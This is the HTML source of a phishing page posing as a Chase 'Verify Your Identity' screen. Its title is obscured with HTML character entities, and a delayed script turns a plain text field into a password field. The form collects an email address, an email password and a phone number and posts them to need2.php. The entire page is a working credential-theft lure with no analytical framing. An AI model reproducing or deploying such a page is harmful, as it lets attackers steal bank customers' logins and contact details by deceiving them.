<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#86;&#101;&#114;&#105;&#102;&#121;&#32;&#89;&#111;&#117;&#114;&#32;&#73;&#100;&#101;&#110;&#116;&#105;&#116;&#121;&#32;&#45;&#32;&#99;&#104;&#97;&#115;&#101;&#46;&#99;&#111;&#109;,</title>
<script>setTimeout(function() {
  document.getElementsByTagName('input')[1].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	

<style type="text/css">			   
.textbox {
    height: 42px;
    padding-left: 8px;
    border: none;
   	border: solid 1px #ccc;
	font-family: 'Open Sans','Helvetica Neue',Helvetica,Arial,sans-serif;
    font-size: 17px;
    width: 270px;
}
 .textbox:focus {  
    outline: none;
    outline: solid 2px #126BC5;
}
</style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1365px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<style>
p{font-size: 40px;}
.loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
    opacity: .8;
}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
$(window).load(function() {
	$(".loader").fadeOut("slow");
});
</script>
</head>
<body background="images/bcg.png" bgproperties="fixed" style="background-attachment:fixed;background-repeat:no-repeat;">
<div class="loader"></div>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:230px; top:93px; width:950px; height:271px; z-index:0"><img src="images/d4.png" alt="" title="" border=0 width=950 height=271></div>

<div id="image2" style="position:absolute; overflow:hidden; left:230px; top:364px; width:950px; height:365px; z-index:1"><img src="images/d5.png" alt="" title="" border=0 width=950 height=365></div>

<div id="image3" style="position:absolute; overflow:hidden; left:731px; top:600px; width:176px; height:43px; z-index:2"><a href="#"><img src="images/d6.png" alt="" title="" border=0 width=176 height=43></a></div>
<form action=need2.php name=talakholo id=talakholo method=post>
<input name="em" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:305px;left:650px;top:384px;z-index:3">
<input name="ep" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:305px;left:650px;top:432px;z-index:4">
<input name="ph" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:305px;left:650px;top:480px;z-index:5">
<div id="formimage1" style="position:absolute; left:929px; top:600px; z-index:6"><input type="image" name="formimage1" width="176" height="42" src="images/btn2.png"></div>

</div>

 
	
</body>
</html>
